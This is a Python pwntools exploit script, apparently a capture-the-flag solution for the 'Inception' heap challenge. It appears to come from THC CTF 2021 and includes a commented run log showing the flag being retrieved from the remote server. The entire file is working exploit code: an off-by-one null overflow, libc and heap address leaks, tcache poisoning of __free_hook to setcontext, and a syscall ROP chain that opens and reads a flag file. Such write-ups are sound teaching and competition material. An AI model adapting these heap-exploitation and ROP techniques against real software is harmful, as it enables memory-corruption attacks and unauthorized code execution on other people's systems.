from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './inception'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "remote2.thcon.party"
  PORT = 10904
  s = remote(HOST, PORT)
  libc = elf.libc
  file_fd = 5
else:
  s = process(BINARY)
  libc = elf.libc
  file_fd = 3

def Add(size, data):
  s.sendlineafter("> ", "1")
  s.sendlineafter(": ", str(size))
  s.sendlineafter(": ", data)

def Delete(idx):
  s.sendlineafter("> ", "2")
  s.sendlineafter(": ", str(idx))

def Edit(idx, data):
  s.sendlineafter("> ", "3")
  s.sendlineafter(": ", str(idx))
  s.sendlineafter(": ", data)

def View(idx):
  s.sendlineafter("> ", "4")
  s.sendlineafter(": ", str(idx))

Add(0x420, "A"*0x10) #0
Add(0xa8, "B"*0x10) #1
Add(0xa8, "C"*0x10) #2
Add(0x68, "D"*0x10) #3
Add(0x5f0, "E"*0x10) #4
Add(0x68, "F"*0x10) #5

# off by one null data single byte overflow
Delete(0)
Edit(3, "G"*0x60+p64(0x600))

# libc leak
Delete(4)
Add(0x420, "H"*0x10)
View(1)

s.recvuntil("Dream content: ")
r = s.recvuntil("\n")[:-1]

libc_leak = u64(r + '\x00\x00')
libc_base = libc_leak - 0x3ebca0
free_hook = libc_base + libc.sym.__free_hook
setcontext_addr = libc_base + libc.sym.setcontext + 53

print "libc_leak =", hex(libc_leak)
print "libc_base =", hex(libc_base)
print "free_hook =", hex(free_hook)
print "setcontext =", hex(setcontext_addr)

# heap leak
View(0)
s.recvuntil("Dream content: ")
s.recvuntil("\n")
r = s.recvuntil("\n")[:-1]
heap_leak = u64('\x00'+ r + '\x00\x00')
heap_base = heap_leak - 0x200
print "heap_leak =", hex(heap_leak)
print "heap_base =", hex(heap_base)

# tcache poisoning
Delete(2)
Add(0xc0, "I"*0xa0+p64(0)+p64(0xb1)+p64(free_hook))
Delete(5)

Add(0xa0, "J"*0x80+p64(free_hook + 0x10))
Add(0xa0, p64(setcontext_addr))

syscall_ret = libc_base + 0xd2745 # syscall; ret; 
pop_rax_ret = libc_base + 0x43ae8 # pop rax; ret; 
pop_rdi_ret = libc_base + 0x215bf # pop rdi; ret;
pop_rsi_ret = libc_base + 0x23eea # pop rsi; ret;
pop_rdx_ret = libc_base + 0x1b96  # pop rdx; ret;

buf  = "/home/user/flag.txt\x00"
buf += "J"*(0x20 - len(buf))
buf += "\xeb\xfe" + "K" * 0x46
buf += p64(heap_base + 0x260) #rdi
buf += p64(0) # rsi
buf += p64(0) # rbp
buf += p64(0) # rbx
buf += p64(0) # rdx
buf += p64(0) # 
buf += p64(0) # rcx
buf += p64(heap_base + 0x310) # rsp
buf += p64(pop_rax_ret) #rcx
buf += p64(2)
buf += p64(syscall_ret)
buf += p64(pop_rax_ret)
buf += p64(0)
buf += p64(pop_rdi_ret)
buf += p64(file_fd)     # local = 3, remote = 5
buf += p64(pop_rsi_ret)
buf += p64(heap_base + 0xc00)
buf += p64(pop_rdx_ret)
buf += p64(0x100)
buf += p64(syscall_ret)
buf += p64(pop_rax_ret)
buf += p64(1)
buf += p64(pop_rdi_ret)
buf += p64(1)
buf += p64(syscall_ret)
buf += p64(pop_rax_ret)
buf += p64(10)
buf += p64(pop_rdi_ret)
buf += p64(heap_base)
buf += p64(pop_rsi_ret)
buf += p64(0x1000)
buf += p64(pop_rdx_ret)
buf += p64(7)
buf += p64(syscall_ret)
buf += p64(heap_base + 0x280)
Edit(0, buf)

Delete(0)

'''
mito@ubuntu:~/CTF/THC_CTF_2021/Pwn_Inception_500$ python solve.py r
[*] '/home/mito/CTF/THC_CTF_2021/Pwn_Inception_500/inception'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to remote2.thcon.party on port 10904: Done
[*] '/home/mito/CTF/THC_CTF_2021/Pwn_Inception_500/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
libc_leak = 0x7f8321d8eca0
libc_base = 0x7f83219a3000
free_hook = 0x7f8321d908e8
setcontext = 0x7f83219f51b5
heap_leak = 0x5572e4af3200
heap_base = 0x5572e4af3000
[*] Switching to interactive mode
THCon21{i5_7h15_b4byR0P_0r_B4byH34P???}
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
'''

s.interactive()
